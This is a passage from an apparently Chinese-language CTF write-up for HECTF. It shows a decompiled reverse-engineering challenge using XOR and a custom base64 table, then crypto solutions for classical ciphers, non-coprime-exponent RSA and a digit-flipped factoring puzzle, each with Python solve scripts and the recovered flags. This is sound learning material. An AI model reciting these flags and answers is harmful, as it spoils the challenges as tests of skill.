class="built_in">BYTE1</span>(v12)) | (<span class="built_in">BYTE2</span>(v12) &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int8)(<span class="number">4</span> * <span class="built_in">BYTE2</span>(v12)) | (<span class="built_in">HIBYTE</span>(v12) &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">HIBYTE</span>(v12) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">76</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = v10 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">BYTE1</span>(v12) = *(_BYTE *)v9;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) &amp; <span class="number">0x30</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)((<span class="type">char</span> *)&amp;v12 + <span class="number">1</span>) = *v9;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) &amp; <span class="number">0x30</span> | (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="built_in">BYTE2</span>(v12) &gt;&gt; <span class="number">4</span>))));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">4</span> * <span class="built_in">BYTE2</span>(v12)) &amp; <span class="number">0x3C</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(a2, v11);</span><br><span class="line">  std::string::~<span class="built_in">string</span>();</span><br><span class="line">  <span class="keyword">return</span> v15 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		这里就是典型的算法识别，实现的是一个 base64 加密，再就是这个函数，对 v6 进行了处理（我们输入的 flag 就是这个）：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_13A9</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// bl</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = std::string::<span class="built_in">length</span>(a2);</span><br><span class="line">  v5 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">  v8 = *(_QWORD *)<span class="built_in">sub_1DC2</span>(&amp;v5, &amp;v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_BYTE *)std::string::<span class="keyword">operator</span>[](a1, i);</span><br><span class="line">    v3 = *(_BYTE *)std::string::<span class="keyword">operator</span>[](a2, i) ^ v2;</span><br><span class="line">    *(_BYTE *)std::string::<span class="keyword">operator</span>[](a1, i) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		不过这个函数显而易见是用来干扰人的，这里对字符串异或之后存放的是第一个字符串地址，但 flag 是第二个参数，所以程序分析完了，其他的都不咋有用了，之后就是直接找数据，在最后那个异或函数里面存在一个数组 dword_4020 [j]，没有在函数中定义过，所以直接推测在全局变量里，双击跟进找到了，在 bss 段上：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000004020 ; _DWORD dword_4020[64]</span><br><span class="line">.data:0000000000004020 dword_4020      dd 81, 67, 84, 67, 85, 66, 90, 118, 79, 70, 72, 115, 92</span><br><span class="line">.data:0000000000004020                                         ; DATA XREF: sub_17A7+F8↑o</span><br><span class="line">.data:0000000000004054                 dd 70, 125, 107, 78, 80, 85, 104, 81, 85, 125, 62, 69</span><br><span class="line">.data:0000000000004084                 dd 93, 67, 103, 69, 62, 59, 61, 71, 73, 83, 32, 84, 89</span><br><span class="line">.data:00000000000040B8                 dd 67, 96, 64, 95, 73, 126, 69, 56, 117, 56, 71, 124, 37</span><br><span class="line">.data:00000000000040EC                 dd 41, 90, 125, 89, 99, 95, 70, 87, 56, 95, 66, 121, 40</span><br></pre></td></tr></table></figure>
<p>​		提取数据，然后写个脚本，根据异或算法写：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  v6[i] = *(<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i) ^ (i / <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<p>​		exp 为：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compare</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag[])</span></span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> target[] = &#123;<span class="number">81</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">67</span>,<span class="number">85</span>,<span class="number">66</span>,<span class="number">90</span>,<span class="number">118</span>,<span class="number">79</span>,<span class="number">70</span>,<span class="number">72</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">70</span>,<span class="number">125</span>,<span class="number">107</span>,<span class="number">78</span>,<span class="number">80</span>,<span class="number">85</span>,<span class="number">104</span>,<span class="number">81</span>,<span class="number">85</span>,<span class="number">125</span>,<span class="number">62</span>,<span class="number">69</span>,<span class="number">93</span>,<span class="number">67</span>,<span class="number">103</span>,<span class="number">69</span>,<span class="number">62</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">83</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">89</span>,<span class="number">67</span>,<span class="number">96</span>,<span class="number">64</span>,<span class="number">95</span>,<span class="number">73</span>,<span class="number">126</span>,<span class="number">69</span>,<span class="number">56</span>,<span class="number">117</span>,<span class="number">56</span>,<span class="number">71</span>,<span class="number">124</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">90</span>,<span class="number">125</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">87</span>,<span class="number">56</span>,<span class="number">95</span>,<span class="number">66</span>,<span class="number">121</span>,<span class="number">40</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">compare</span>(target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compare</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">64</span>;</span><br><span class="line">    <span class="type">char</span> f[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i)&#123;</span><br><span class="line">        f[i] = flag[i] ^ i / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; len; ++i )&#123;</span><br><span class="line">        std::cout &lt;&lt; f[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//QCTBTCXtMEKpXBynKUSnWRz9MUKnL717MBX+XUOmMRGpK7z7Wl58KlKqMUD+KVm=</span></span><br></pre></td></tr></table></figure>
<p>​		之后就是 base64 解密，不过这里出现了问题，base64 直接解密后发现有不可显示字符，并且再在之前没有任何关于操作 flag 的内容，并且 flag 应该是全是可显示的 <code>HECTF&#123;&#125;</code>  包起来的，所以应该是 base64 变表，找表。</p>
<p>​		在之前的 base64 加密的那个函数里有个数组 <code>dword_2040[i]</code> ，跟进看看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000002040 ; _DWORD dword_2040[64]</span><br><span class="line">.rodata:0000000000002040 dword_2040      dd 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75</span><br><span class="line">.rodata:0000000000002040                                         ; DATA XREF: sub_1920+7F↑o</span><br><span class="line">.rodata:0000000000002074                 dd 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88</span><br><span class="line">.rodata:00000000000020A8                 dd 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43</span><br><span class="line">.rodata:00000000000020DC                 dd 47, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107</span><br><span class="line">.rodata:000000000000210C                 dd 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118</span><br><span class="line">.rodata:0000000000002138                 dd 119, 120</span><br></pre></td></tr></table></figure>
<p>​		提取出来输出出来是：yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx</p>
<p>​		所以，这个就是变了之后的表，拿着这个去解密，成功得到 flag：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;8c7d051e5a0e9c567c86fed492720cc8d3389af1&#125;</span><br></pre></td></tr></table></figure>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto：</h2>
<h3 id="迷茫的艾米莉"><a class="markdownIt-Anchor" href="#迷茫的艾米莉">#</a> 迷茫的艾米莉</h3>
<p>Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr</p>
<p>key:  6</p>
<p P0fo2bb51lbbmew_0f_rczav9_jv="">YIUIT</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jeWJlcmNoZWYub3JnLyNyZWNpcGU9UmFpbF9GZW5jZV9DaXBoZXJfRW5jb2RlKDYsMC9kaXNhYmxlZClSYWlsX0ZlbmNlX0NpcGhlcl9EZWNvZGUoNiwwKQ==">Rail Fence Cipher Encode, 1 more - CyberChef</span></p>
<p>key:  responsibility</p>
<p C0ng2at51ations_0n_comin9_in="">HECTF</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvd2VpamluaXlhbWltYS5waHA=">维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</span></p>
<h3 id="seven-more"><a class="markdownIt-Anchor" href="#seven-more">#</a> seven more</h3>
<p>e 和 phi 不互素的情况下和欧拉值也不互素 甚至现在 e 和 q 也不互素了</p>
<p>与传统 amm 不同的是 还要求出所有的 mq7</p>
<p>以下是解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">e = <span class="number">1009</span>*<span class="number">7</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span>(powmod(p, (q-<span class="number">1</span>)//e, q) == <span class="number">1</span>):  <span class="comment"># (r,s)=1</span></span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">o, r, q</span>):  <span class="comment"># r|(q-1</span></span><br><span class="line">    <span class="keyword">assert</span>((q-<span class="number">1</span>) % r == <span class="number">0</span>)</span><br><span class="line">    p = onemod(r, q)</span><br><span class="line"></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(s % r == <span class="number">0</span>):</span><br><span class="line">        s = s//r</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>((s*k+<span class="number">1</span>) % r != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (s*k+<span class="number">1</span>)//r</span><br><span class="line"></span><br><span class="line">    a = powmod(p, r**(t-<span class="number">1</span>)*s, q)</span><br><span class="line">    b = powmod(o, r*a-<span class="number">1</span>, q)</span><br><span class="line">    c = powmod(p, s, q)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = powmod(<span class="built_in">int</span>(b), r**(t-<span class="number">1</span>-i), q)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (-math.log(d, a)) % r</span><br><span class="line">        b = (b*(c**(r*j))) % q</span><br><span class="line">        h = (h*c**j) % q</span><br><span class="line">        c = (c*r) % q</span><br><span class="line">    result = (powmod(o, alp, q)*h)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr*m) % q</span><br><span class="line">        <span class="comment"># assert(pow(r, e, q) == cq)</span></span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;HECTF&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CHECK2</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = invert(q, p)</span><br><span class="line">    t2 = invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1*t1*q+mq1*t2*p) % (p*q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_ROOT</span>(<span class="params">r, q</span>):</span><br><span class="line">    li = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(li) &lt; r):</span><br><span class="line">        p = powmod(random.randint(<span class="number">1</span>, q-<span class="number">1</span>), (q-<span class="number">1</span>)//r, q)</span><br><span class="line">        li.add(p)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, <span class="number">1009</span>, q)</span><br><span class="line"></span><br><span class="line">rt1 = AMM_ROOT(e, p)</span><br><span class="line">rt2 = AMM_ROOT(<span class="number">1009</span>, q)</span><br><span class="line"></span><br><span class="line">ammp = AMM_Solution(mp, p, rt1, cp, e)</span><br><span class="line">ammq = AMM_Solution(mq, q, rt2, cq, <span class="number">1009</span>)</span><br><span class="line"></span><br><span class="line">d = invert(<span class="number">7</span>, q-<span class="number">1</span>)</span><br><span class="line">mqs = []</span><br><span class="line"><span class="keyword">for</span> mq <span class="keyword">in</span> ammq:</span><br><span class="line">    mqs.append(<span class="built_in">pow</span>(mq, d, q))</span><br><span class="line">ammq = mqs</span><br><span class="line">CHECK2(ammp, ammq, e, p, q)</span><br><span class="line"><span class="comment">##HECTF&#123;go0d_jOb_At_AmM&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="翻一翻"><a class="markdownIt-Anchor" href="#翻一翻">#</a> 翻一翻：</h3>
<p>爆破思路类似 RSA parity oracle。p,q 是 bit 翻转关系， 已知 p 最低的 k 位，则已知 q</p>
<p>最高的 k 位。假设已知 k 位的 p,q ，记为 ph,qh，利用不等式</p>
<p>ph ·qh.21024-2k &lt;=n&lt;(ph+1) ·(qh+ 1).21024-2k</p>
<p>逐位向低地址爆破，不断收缩不等式的范围，最终可求得 p，q 的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1)%(<span class="number">10</span>**(k+<span class="number">1</span>))) != (n%(<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i*(<span class="number">10</span>**<span class="number">77</span>), i*(<span class="number">10</span>**<span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span></span><br><span class="line">q = <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line">m = base64.b64decode(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#b&#x27;HECTF&#123;I_rea1ly_l0ve_c2ypto!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="不合格的魔药"><a class="markdownIt-Anchor" href="#不合格的魔药">#</a> 不合格的魔药：</h3>
